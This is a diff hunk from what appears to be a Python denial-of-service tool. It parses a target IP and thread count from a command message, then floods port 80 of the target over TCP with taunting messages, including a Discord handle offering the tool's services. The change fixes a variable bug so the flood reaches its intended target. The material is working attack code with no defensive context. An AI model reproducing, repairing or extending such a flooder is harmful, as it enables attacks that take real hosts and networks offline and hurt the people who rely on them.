@@ -100,7 +100,7 @@ def system():
 							ip = msg.split(" ")[1]
 							numThreads = int(msg.split(" ")[2])
 
-							resolvedTarget = socket.gethostbyname(target)
+							resolvedTarget = socket.gethostbyname(ip)
 
 							message = ["Hello, and I am sorry but, goodbye!", "Routers are such fragile things, aren't they?", "This message is dank af", "Discord: [SuperNova] Law#6800 <== Contact me if u want :3", "Humans are so bad with DDoS protection :)"]
 
@@ -111,7 +111,7 @@ def system():
 								sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 								try:
 									randomMsg = random.choice(message)
-									sock.connect((target, 80))
+									sock.connect((ip, 80))
 									sock.send(randomMsg)
 									sock.sendto(randomMsg, (resolvedTarget, 80))
 									sock.send(randomMsg)
